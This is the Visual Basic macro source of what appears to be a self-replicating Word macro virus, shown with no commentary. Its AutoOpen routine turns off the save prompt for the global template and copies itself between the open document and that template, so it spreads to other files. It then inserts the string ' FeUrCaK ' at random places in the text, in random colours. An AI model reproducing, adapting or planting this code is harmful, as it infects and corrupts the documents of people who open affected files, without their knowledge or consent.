   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim sk
   Dim kiek
   Dim i
   Dim skaic
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   On Error Resume Next
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "global:AutoOpen"
   WordBasic.MacroCopy "global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   Rem _____________________________________________

   sk = 0

   WordBasic.StartOfDocument

   While WordBasic.WordRight(1) <> 0
       sk = sk + 1
       WordBasic.WordRight
   Wend

   If sk > 99 Then

   kiek = WordBasic.Int(Rnd() * 7)

   For i = 1 To kiek
       If WordBasic.Int(Rnd() * 1000) < 200 Then
           WordBasic.StartOfDocument
           skaic = WordBasic.Int(Rnd() * sk)
           WordBasic.WordRight (skaic)
           WordBasic.Italic
           WordBasic.CharColor WordBasic.Int(Rnd() * 16)
           WordBasic.Insert " FeUrCaK "
       End If
   Next i

   End If

   WordBasic.FileSave

   End Sub
